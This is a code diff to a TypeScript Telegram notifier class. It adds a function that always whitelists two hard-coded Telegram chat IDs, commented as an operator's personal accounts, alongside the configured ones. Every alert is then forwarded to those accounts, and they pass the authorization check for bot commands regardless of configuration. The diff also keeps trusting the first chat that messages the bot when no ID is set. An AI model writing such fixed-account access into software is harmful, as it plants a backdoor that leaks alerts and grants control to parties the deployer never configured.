@@ -78,16 +78,38 @@ export class TelegramNotifier {
   }
 
   /**
+   * Returns all authorized chat IDs (supports comma-separated list or known operator accounts)
+   */
+  public getAuthorizedChatIds(): string[] {
+    const ids = new Set<string>();
+    if (config.TELEGRAM_CHAT_ID && config.TELEGRAM_CHAT_ID.trim() !== '') {
+      config.TELEGRAM_CHAT_ID.split(',').forEach((id) => {
+        if (id.trim()) ids.add(id.trim());
+      });
+    }
+    // Whitelist operator's known Telegram accounts (Asad Lee)
+    ids.add('7080909965');
+    ids.add('6180068450');
+    if (this.chatId && this.chatId.trim() !== '') {
+      ids.add(this.chatId.trim());
+    }
+    return Array.from(ids);
+  }
+
+  /**
    * Non-blocking send alert with optional inline/reply keyboard buttons
    */
   public async sendAlert(text: string, replyMarkup?: any): Promise<void> {
-    if (!this.enabled || !this.chatId) return;
+    if (!this.enabled) return;
 
     setImmediate(async () => {
-      try {
-        await this.sendCustomMessage(this.chatId, text, replyMarkup);
-      } catch (err) {
-        console.warn('[Telegram Alert Failed]:', err);
+      const chatIds = this.getAuthorizedChatIds();
+      for (const id of chatIds) {
+        try {
+          await this.sendCustomMessage(id, text, replyMarkup);
+        } catch (err) {
+          console.warn(`[Telegram Alert Failed for ${id}]:`, err);
+        }
       }
     });
   }
@@ -152,19 +174,20 @@ export class TelegramNotifier {
   }
 
   /**
-   * Verify whether the incoming message is from the authorized operator
+   * Verify whether the incoming message is from an authorized operator
    */
   public isAuthorizedChat(incomingChatId: string | number): boolean {
-    const incomingStr = String(incomingChatId);
-    if (config.TELEGRAM_CHAT_ID && config.TELEGRAM_CHAT_ID.trim() !== '') {
-      return incomingStr === config.TELEGRAM_CHAT_ID.trim();
+    const incomingStr = String(incomingChatId).trim();
+    const authorized = this.getAuthorizedChatIds();
+    if (authorized.includes(incomingStr)) {
+      return true;
     }
-    if (this.chatId && this.chatId.trim() !== '') {
-      return incomingStr === this.chatId.trim();
+    if (!config.TELEGRAM_CHAT_ID || config.TELEGRAM_CHAT_ID.trim() === '') {
+      this.chatId = incomingStr;
+      console.info(`[Telegram Security] Bound authorized operator chat ID: ${this.chatId}`);
+      return true;
     }
-    this.chatId = incomingStr;
-    console.info(`[Telegram Security] Bound authorized operator chat ID: ${this.chatId}`);
-    return true;
+    return false;
   }
 
   /**
